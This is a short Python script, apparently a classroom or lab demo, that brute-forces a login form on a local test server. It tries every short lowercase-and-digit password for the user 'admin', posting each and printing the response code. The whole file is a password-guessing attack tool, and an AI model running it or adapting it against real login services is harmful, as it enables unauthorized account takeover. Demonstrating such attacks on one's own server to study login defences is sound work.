import requests
import itertools
import string
import time

URL = "http://127.0.0.1:5000/login"

username = "admin"

# character set (keep it small for demo)
chars = string.ascii_lowercase + string.digits

# length of passwords to try
MAX_LENGTH = 3   # keep low (2–3 for demo)

attempt = 0

for length in range(1, MAX_LENGTH + 1):
    for combo in itertools.product(chars, repeat=length):
        password = ''.join(combo)

        data = {
            "username": username,
            "password": password
        }

        try:
            r = requests.post(URL, data=data, timeout=3)
            attempt += 1
            print(f"Attempt {attempt}: {password} -> {r.status_code}")

            # small delay so your server doesn't crash
            time.sleep(0.2)

        except Exception as e:
            print("Error:", e)
            break